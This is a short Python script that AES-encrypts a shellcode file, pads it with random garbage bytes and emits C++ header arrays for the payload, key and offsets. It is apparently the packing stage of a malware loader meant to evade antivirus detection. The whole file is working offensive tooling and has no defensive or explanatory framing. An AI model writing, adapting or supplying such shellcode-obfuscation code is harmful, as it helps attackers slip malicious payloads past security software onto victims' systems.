# encrypt_shellcode_with_garbage.py

import os
import random
from Crypto.Cipher import AES

def pad(data):
    padding_len = 16 - (len(data) % 16)
    return data + bytes([padding_len] * padding_len)

def random_bytes(length):
    return os.urandom(length)

def save_array(array, var_name, filename):
    with open(filename, 'w') as f:
        f.write(f"std::vector<uint8_t> {var_name} = {{\n")
        for i, b in enumerate(array):
            f.write(f"0x{b:02X}, ")
            if (i + 1) % 12 == 0:
                f.write("\n")
        f.write("\n};\n")

def main():
    input_file = "shell.bin"
    output_payload = "encrypted_payload.h"
    output_key = "aes_key.h"
    output_meta = "meta.h"

    with open(input_file, "rb") as f:
        shellcode = f.read()

    key = os.urandom(16)
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(pad(shellcode))

    garbage_before = random_bytes(random.randint(32, 64))
    garbage_after = random_bytes(random.randint(32, 64))

    start_offset = len(garbage_before)
    encrypted_payload = garbage_before + encrypted + garbage_after
    encrypted_length = len(encrypted)

    save_array(encrypted_payload, "encrypted_payload", output_payload)
    save_array(key, "aes_key", output_key)

    with open(output_meta, 'w') as f:
        f.write(f"const int start_offset = {start_offset};\n")
        f.write(f"const int encrypted_length = {encrypted_length};\n")

    print("[+] Encrypted payload with garbage bytes generated.")

if __name__ == "__main__":
    main()
